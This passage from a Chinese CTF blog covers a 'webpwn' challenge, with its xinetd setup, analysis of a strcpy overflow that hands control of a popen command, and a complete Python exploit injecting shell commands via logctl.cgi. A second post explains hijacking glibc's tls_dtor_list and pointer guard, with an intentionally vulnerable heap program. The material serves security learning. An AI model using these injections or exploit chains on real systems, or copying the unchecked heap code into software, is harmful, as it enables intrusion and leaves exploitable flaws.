--------------------------main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> REMOTE:</span><br><span class="line">        io = remote(server_ip, server_port)</span><br><span class="line">        <span class="keyword">if</span> LIBC:</span><br><span class="line">            libc = ELF(libc_path)</span><br><span class="line">        elf = ELF(elf_path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        elf = ELF(elf_path)</span><br><span class="line">        <span class="keyword">if</span> LIBC:</span><br><span class="line">            libc = ELF(libc_path)</span><br><span class="line">            io = elf.process()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            io = elf.process()</span><br><span class="line"></span><br><span class="line">    exploit()</span><br><span class="line">    finish()</span><br></pre></td></tr></table></figure></div>



<h3 id="2-desktop"><a href="#2-desktop" class="headerlink" title="2.desktop"></a>2.desktop</h3><h4 id="xinetd信息"><a href="#xinetd信息" class="headerlink" title="xinetd信息"></a>xinetd信息</h4><p><code>xinetd</code> 配置文件是用于配置和管理 <code>xinetd</code> 服务的文件。<code>xinetd</code>（Extended Internet Service Daemon）是一个超级服务器守护进程，用于管理和启动各种 Internet 服务（如 FTP、Telnet 等），它可以监听指定的端口并在有连接请求时启动相应的服务。</p>
<h5 id="xinetd配置文件的主要类型"><a href="#xinetd配置文件的主要类型" class="headerlink" title="xinetd配置文件的主要类型"></a>xinetd配置文件的主要类型</h5><ol>
<li><strong>主配置文件</strong> (<code>/etc/xinetd.conf</code>):<ul>
<li>这是 <code>xinetd</code> 的全局配置文件，用于设置全局选项，如日志记录、服务目录等。</li>
</ul>
</li>
<li><strong>服务配置文件</strong> (<code>/etc/xinetd.d/</code> 目录):<ul>
<li>在这个目录中，每个文件定义了一个服务的配置。这些文件可以定义服务的启动方式、端口、协议、运行环境等。我们dockerfile中就有一句COPY .&#x2F;pwn.xinetd &#x2F;etc&#x2F;xinetd.d&#x2F;pwn，将配置导进去。</li>
</ul>
</li>
</ol>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">service pwn</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">disable</span> = no</span><br><span class="line">    flags = REUSE</span><br><span class="line">    socket_type = stream</span><br><span class="line">    protocol    = tcp</span><br><span class="line">    <span class="built_in">wait</span>        = no</span><br><span class="line">    user        = root</span><br><span class="line">    <span class="built_in">type</span>        = UNLISTED</span><br><span class="line">    port        = 1933</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">bind</span>        = 0.0.0.0</span><br><span class="line">    server      = /usr/sbin/chroot   </span><br><span class="line">    server_args = --userspec=1000:1000 /home/pwn ./pwn /var/www/html 2&gt;/dev/null</span><br><span class="line">    <span class="comment"># safety options</span></span><br><span class="line">    per_source  = 5 <span class="comment"># the maximum instances of this service per source IP address</span></span><br><span class="line">    rlimit_cpu  = 20 <span class="comment"># the maximum number of CPU seconds that the service may use</span></span><br><span class="line">    rlimit_as  = 100M <span class="comment"># the Address Space resource limit for the service</span></span><br><span class="line">    <span class="comment">#access_times = 8:50-17:10</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h5 id="相关设置解释"><a href="#相关设置解释" class="headerlink" title="相关设置解释"></a>相关设置解释</h5><p><strong><code>disable = no</code></strong>:</p>
<ul>
<li>表示该服务是启用的。</li>
</ul>
<p><strong><code>flags = REUSE</code></strong>:</p>
<ul>
<li>允许重用端口，使得服务能够在连接关闭后快速重新绑定端口。</li>
</ul>
<p><strong><code>socket_type = stream</code></strong>:</p>
<ul>
<li>指定服务使用流套接字（即 TCP），用于可靠的双向通信。</li>
</ul>
<p><strong><code>protocol = tcp</code></strong>:</p>
<ul>
<li>指定使用 TCP 协议。</li>
</ul>
<p><strong><code>wait = no</code></strong>:</p>
<ul>
<li>指定服务不等待新连接，而是立即返回并处理新的连接请求。</li>
</ul>
<p><strong><code>user = root</code></strong>:</p>
<ul>
<li>指定服务以 root 用户身份运行。这意味着服务将具有系统上最高权限，因此需要小心安全设置。</li>
</ul>
<p><strong><code>type = UNLISTED</code></strong>:</p>
<ul>
<li>表示服务不是标准服务（即不在服务列表中）。</li>
</ul>
<p><strong><code>port = 1933</code></strong>:</p>
<ul>
<li>指定服务监听的端口是 1933。我们就是把主机端口映射到这个端口。</li>
</ul>
<p><strong><code>bind = 0.0.0.0</code></strong>:</p>
<ul>
<li>表示服务绑定在所有网络接口上，允许来自任何 IP 地址的连接。</li>
</ul>
<p><strong><code>server = /usr/sbin/chroot</code></strong>:</p>
<ul>
<li>指定用于运行服务的命令。在这里，<code>chroot</code> 用于创建一个新的根文件系统环境，以限制服务的访问范围。</li>
</ul>
<p><strong><code>server_args = --userspec=1000:1000 /home/pwn ./pwn /var/www/html 2&gt;/dev/null</code></strong>:</p>
<ul>
<li><code>--userspec=1000:1000</code>：指定以用户 ID 1000 和组 ID 1000 的权限运行 <code>pwn</code> 程序。根据配置，用户 ID 1000 可能是 <code>pwn</code> 用户。</li>
<li><code>/home/pwn</code>：指定 <code>chroot</code> 环境的根目录。</li>
<li><code>./pwn</code>：指定要执行的二进制文件 <code>pwn</code>。这个路径相对于 <code>/home/pwn</code>。</li>
<li><code>/var/www/html</code>：<code>pwn</code> 程序的参数，可能是 Web 服务器的根目录或其他服务相关目录。</li>
<li><code>2&gt;/dev/null</code>：将错误输出重定向到 <code>/dev/null</code>，忽略错误信息。</li>
</ul>
<p><strong><code>per_source = 5</code></strong>:</p>
<ul>
<li>限制每个源 IP 地址可以启动的服务实例数量为 5 个。</li>
</ul>
<p><strong><code>rlimit_cpu = 20</code></strong>:</p>
<ul>
<li>限制服务可以使用的最大 CPU 时间为 20 秒。</li>
</ul>
<p><strong><code>rlimit_as = 100M</code></strong>:</p>
<ul>
<li>限制服务使用的最大地址空间为 100 MB。</li>
</ul>
<p>**<code>access_times = 8:50-17:10</code>**（注释掉了）:</p>
<ul>
<li>如果启用，限制服务的访问时间。</li>
</ul>
<h4 id="环境搭建踩坑"><a href="#环境搭建踩坑" class="headerlink" title="环境搭建踩坑"></a>环境搭建踩坑</h4><p>这里题目给出的镜像如果直接build的话可能会有以下报错</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212642490.png"
                      class=""
                >

<p>解决方法可以是在dockerfile中手动把requests的版本指定好，我本地requests&#x3D;&#x3D;2.21.0可以成功构建。</p>
<p>然后IDA调试中，其中上面设置的信息的路径是容器中的路径，然后我用主机的6666端口映射到容器中gdbserver的默认端口</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212651224.png"
                      class=""
                >

<p>之后patch时除了patch出一个死循环以外，还要把alarm给nop掉，不然会很快退出。</p>
<p>之后要curl连的时候注意在容器中用的端口是它虚拟的端口，而不是主机映射的端口。（这里我把主机1337映射到容器1933端口）</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212700543.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212709096.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212717324.png"
                      class=""
                >

<p>然后把死循环跳转改回来就可以继续调试了。这种方法也可以用于上一题的调试。</p>
<h4 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h4><p>前面的一些检测正常发包是不会被卡住的，除非curl时手动加上的X-Forwarded-For长度或格式不对。</p>
<p>main函数主要逻辑在这里，其中会从Cgi表中逐个匹配我们所请求的资源名，如果匹配上就检测X-Forwarded-For的值是否为192.168.1.x(x&lt;&#x3D;20)，这里dest全局变量就是存着X-Forwarded-For的值。v21是’?’后面的get请求参数，必须要有。v22是ring_token参数，也必须被设置。之后会调用对应的cgi函数。题目中的cgi函数有那么几个：login.cgi，logout.cgi，wifictl.cgi，logctl.cgi。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212726642.png"
                      class=""
                >

<p>然后我们查看函数表，发现里面有popen危险函数，然后看交叉引用就能找到logctl的具体实现。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212734273.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212742727.png"
                      class=""
                >

<p>然后就能看到其具体实现，我们的目标就很明确了，想办法实现command的任意控制。</p>
<h4 id="利用方式-1"><a href="#利用方式-1" class="headerlink" title="利用方式"></a>利用方式</h4><p>这里sscanf函数没见过，查一下是可以以一个格式化字符串匹配，然后把第一个参数分割成若干块存在后面的参数中。</p>
<p><code>%[^:]</code>表示匹配直到遇到下一个冒号为止的所有字符，并将它们存储在第二个参数指定的字符数组中。</p>
<p>首先得绕过logctl函数中前面两个判断，token的格式必须为 <code>数字:数字</code>，然后：前面的数字会和两个值进行比较，要在范围外才能过。那么我们继续看交叉引用。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212751018.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212759252.png"
                      class=""
                >

<p>发现是一个时间值，而且如果调用wifictl会把这个值打印出来。那么只要先访问这个cgi，就可以得到time的值，而另一端边界值固定为0x3c，那么我们设置token前半部分为time+1就行。</p>
<p>之后发现command的值与v5有关，sub_402CAC这个函数会获取特殊字符，而前面的ban_char函数则是漏洞所在点。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212812164.png"
                      class=""
                >

<p>主体逻辑是判断是否有v12中存的非法字符，我们通过logctl本体中<code>echo no support char is %s &gt; /var/www/blockingString</code>就能猜测这个逻辑。但是strcpy(s,a2)没有长度限制，可以溢出写v14，最后又会把v14写回a3，也就是v5，就实现了对command的控制。a2就是我们get传的参数值，上面会进行遍历参数键值对，所以我们用哪个参数触发漏洞都行。</p>
<p>之后就能直接打了，由于是与web服务器交互，所以要用request库进行exp编写。这里我也懒得再写一份exp了，直接用提供的exp，改个端口，能正常获取flag。</p>
<h5 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h5><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">if</span> url[<span class="built_in">len</span>(url) - <span class="number">1</span>] != <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Target URL Format Error,The last char in url must be &#x27;/&#x27;.&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    warnings.filterwarnings(<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    s = requests.session()</span><br><span class="line">    s.verify = <span class="literal">False</span></span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;X-Forword-For&#x27;</span>: <span class="string">&#x27;192.168.1.1&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># print(&quot;[+] login...&quot;)</span></span><br><span class="line">        ret = s.get(<span class="string">&quot;&#123;&#125;wifictl.cgi?ring_token=1&quot;</span>.<span class="built_in">format</span>(url), headers=header, timeout=<span class="number">8</span>)</span><br><span class="line">        <span class="keyword">if</span> ret.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;now time is&quot;</span> <span class="keyword">in</span> ret.content.decode():</span><br><span class="line">                time_ret = re.search(<span class="string">r&quot;now time is (.+?)\.\n&quot;</span>,ret.content.decode())</span><br><span class="line">                <span class="keyword">if</span> time_ret <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;[-] time_ret re error, cannot get time&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    now_time = time_ret.group(<span class="number">1</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;[+] now time is &quot;</span> + now_time)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[-] time_ret re error, cannot get time&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] status_code error, cannot get time&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        </span><br><span class="line">        cmd = <span class="string">&quot;a;&quot;</span> + <span class="string">&quot;a&quot;</span>*<span class="number">1311</span> + <span class="string">&quot;cat /flag &gt;/var/www/html/flag;&quot;</span>       </span><br><span class="line">        new_url = <span class="string">&quot;&#123;&#125;logctl.cgi?ring_token=&#123;&#125;:1&amp;aa=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(url, <span class="built_in">int</span>(now_time)+<span class="number">1</span>, cmd)</span><br><span class="line">        ret = s.get(new_url, headers=header, timeout=<span class="number">8</span>)</span><br><span class="line">        ret = s.get(<span class="string">&quot;&#123;&#125;flag&quot;</span>.<span class="built_in">format</span>(url), headers=header, timeout=<span class="number">8</span>)</span><br><span class="line">        <span class="keyword">if</span> ret.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(ret.content.decode())</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] status_code error, cannot get flag&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        </span><br><span class="line">        cmd = <span class="string">&quot;a;&quot;</span> + <span class="string">&quot;a&quot;</span>*<span class="number">1311</span> + <span class="string">&quot;rm /var/www/html/flag;&quot;</span></span><br><span class="line">        new_url = <span class="string">&quot;&#123;&#125;logctl.cgi?ring_token=&#123;&#125;:1&amp;aa=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(url, <span class="built_in">int</span>(now_time)+<span class="number">1</span>, cmd)</span><br><span class="line">        ret = s.get(new_url, headers=header, timeout=<span class="number">8</span>)</span><br><span class="line">        <span class="keyword">if</span> ret.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] status_code error, cannot rm flag&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> reason:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;timed&#x27;</span> <span class="keyword">in</span> <span class="built_in">repr</span>(reason) <span class="keyword">or</span> <span class="string">&#x27;timeout&#x27;</span> <span class="keyword">in</span> <span class="built_in">repr</span>(reason):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[-] Fail, can not connect target for: timeout&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[-] Fail, can not connect target for: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">repr</span>(reason)))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp(<span class="string">&quot;http://127.0.0.1:1337/&quot;</span>)</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>tls_dtor_list劫持exit执行-高版本glibc利用思路之一</title>
    <url>/blog/2024/11/28/tls-dtor-list%E5%8A%AB%E6%8C%81exit%E6%89%A7%E8%A1%8C-%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B9%8B%E4%B8%80/</url>
    <content><![CDATA[<h4 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h4><p>主要链条：</p>
<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="code"><pre><span class="line">exit-&gt;__run_exit_handlers-&gt;__call_tls_dtors</span><br></pre></td></tr></table></figure></div>

<p>源码：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#  <span class="keyword">define</span> PTR_DEMANGLE(var)     PTR_MANGLE (var)</span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> PTR_MANGLE(var) \</span></span><br><span class="line"><span class="meta">  (var) = (__typeof (var)) ((uintptr_t) (var) ^ THREAD_GET_POINTER_GUARD ())</span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> THREAD_GET_POINTER_GUARD() \</span></span><br><span class="line"><span class="meta">  THREAD_GETMEM (THREAD_SELF, header.stack_guard)</span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> THREAD_GETMEM(descr, member) \</span></span><br><span class="line"><span class="meta">  descr-&gt;member</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line">__call_tls_dtors (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span> (tls_dtor_list)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> *<span class="title">cur</span> =</span> tls_dtor_list;</span><br><span class="line">      dtor_func func = cur-&gt;func;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">      PTR_DEMANGLE (func);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      tls_dtor_list = tls_dtor_list-&gt;next;</span><br><span class="line">      func (cur-&gt;obj);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Ensure that the MAP dereference happens before</span></span><br><span class="line"><span class="comment">	 l_tls_dtor_count decrement.  That way, we protect this access from a</span></span><br><span class="line"><span class="comment">	 potential DSO unload in _dl_close_worker, which happens when</span></span><br><span class="line"><span class="comment">	 l_tls_dtor_count is 0.  See CONCURRENCY NOTES for more detail.  */</span></span><br><span class="line">      atomic_fetch_add_release (&amp;cur-&gt;<span class="built_in">map</span>-&gt;l_tls_dtor_count, <span class="number">-1</span>);</span><br><span class="line">      <span class="built_in">free</span> (cur);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__call_tls_dtors)</span><br><span class="line">......</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  dtor_func func;</span><br><span class="line">  <span class="type">void</span> *obj;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">map</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>



<p>很清楚能看到如果<code>tls_dtor_list</code>不为空，就会把cur指针指向<code>tls_dtor_list</code>，然后将其中func的函数指针字段经过<code>PTR_DEMANGLE</code>处理后，直接作为函数调用，参数是<code>cur-&gt;obj</code>。</p>
<p><code>tls_dtor_list</code>记录了<code>dtor_list</code>这个单向链表的表头，我们可以通过覆盖<code>tls_dtor_list</code>的值为一个我们可控的内存区域，然后就能伪造各个字段了。但最麻烦的是在调用func前有一个异或的逻辑，实际上会与<code>fs:0x30（tcbhead_t-&gt;pointer_guard）</code>处的内容进行异或，那我们首先要想办法泄露出这个内容，或者是直接改写这个位置的内容，才可以调用我们想要的函数。所以一般会利用largebin attack或者unsortedbin attack两次，完成<code>tls_dtor_list</code>的修改以及对<code>tcbhead_t-&gt;pointer_guard</code>的修改。</p>
<h4 id="汇编实现"><a href="#汇编实现" class="headerlink" title="汇编实现"></a>汇编实现</h4><p>主要逻辑如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">&lt;__call_tls_dtors+<span class="number">17</span>&gt;    mov    rbp, qword ptr fs:[rbx]             </span><br><span class="line">&lt;__call_tls_dtors+<span class="number">21</span>&gt;    test   rbp, rbp                            </span><br><span class="line">&lt;__call_tls_dtors+<span class="number">24</span>&gt;    je     __call_tls_dtors+<span class="number">93</span>         </span><br><span class="line">&lt;__call_tls_dtors+<span class="number">26</span>&gt;    nop    word ptr [rax + rax]</span><br><span class="line">&lt;__call_tls_dtors+<span class="number">32</span>&gt;    mov    rdx, qword ptr [rbp + <span class="number">0x18</span>]         </span><br><span class="line">&lt;__call_tls_dtors+<span class="number">36</span>&gt;    mov    rax, qword ptr [rbp]                </span><br><span class="line">&lt;__call_tls_dtors+<span class="number">40</span>&gt;    ror    rax, <span class="number">0x11</span></span><br><span class="line">&lt;__call_tls_dtors+<span class="number">44</span>&gt;    xor    rax, qword ptr fs:[<span class="number">0x30</span>]            </span><br><span class="line">&lt;__call_tls_dtors+<span class="number">53</span>&gt;    mov    qword ptr fs:[rbx], rdx             </span><br><span class="line">&lt;__call_tls_dtors+<span class="number">57</span>&gt;    mov    rdi, qword ptr [rbp + <span class="number">8</span>]            </span><br><span class="line">&lt;__call_tls_dtors+<span class="number">61</span>&gt;    call   rax    </span><br><span class="line">&lt;__call_tls_dtors+<span class="number">63</span>&gt;    mov    rax, qword ptr [rbp + <span class="number">0x10</span>]</span><br><span class="line">&lt;__call_tls_dtors+<span class="number">67</span>&gt;    lock sub qword ptr [rax + <span class="number">0x468</span>], <span class="number">1</span></span><br><span class="line">&lt;__call_tls_dtors+<span class="number">76</span>&gt;    mov    rdi, rbp</span><br><span class="line">&lt;__call_tls_dtors+<span class="number">79</span>&gt;    call   <span class="built_in">free</span>@plt                    &lt;<span class="built_in">free</span>@plt&gt;</span><br></pre></td></tr></table></figure></div>

<p>先是会把rbp指向<code>tls_dtor_list</code>，也就是<code>dtor_list</code>链表的头节点，正是我们修改的地方。然后取出func字段后，会先右移0x11位，再与<code>fs:[0x30]</code>处的内容异或。最后call进行调用。那么我们传func字段时就先异或再左移，就能够解出正确的函数指针。需要注意的是，如果我们不是直接利用头节点处的<code>dtor_list</code>，map域也要进行伪造，使<code>map+0x468</code>为一个可写地址，而且之后的<code>free</code>也需要想办法绕过，所以最好还是直接一次直接利用完成。因为这里<code>mov rdx, qword ptr [rbp + 0x18]</code>直接把rdx拉到我们可控的堆区域了，而且我们控制next域就可以控制rdx的值，其实我们也可以走<code>setcontext</code>的打法。</p>
<h4 id="利用验证"><a href="#利用验证" class="headerlink" title="利用验证"></a>利用验证</h4><p>自己写一个堆的菜单题，不做什么限制方便原理验证。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> *chunk_list[<span class="number">32</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1. Add&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2. Delete&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3. Edit&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4. Show&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;5. Exit&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;choice &gt;&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> idx, size;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;idx:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;idx);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;size:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line">    chunk_list[idx] = <span class="built_in">malloc</span>(size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> idx,size;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;idx:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;idx);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;size:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;content:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>,chunk_list[idx], size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;idx:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;idx);</span><br><span class="line">    <span class="built_in">free</span>(chunk_list[idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;idx:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;idx);</span><br><span class="line">    <span class="built_in">puts</span>(chunk_list[idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">end</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Bye~&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> choice;</span><br><span class="line">    <span class="type">void</span> *libc_base = &amp;<span class="built_in">puts</span>;</span><br><span class="line">    <span class="comment">// printf(&quot;puts_addr:%p\n&quot;,&amp;puts);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;libc_base:%p\n&quot;</span>, libc_base);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        menu();</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;choice);</span><br><span class="line">        <span class="keyword">switch</span> (choice)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            add();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            delete ();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            edit();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            show();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            end();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>首先泄露libc基址和heap基址，这里libc基址我直接在主程序中打印出来了，其实也可以通过<code>show largebin</code>来获得。</p>
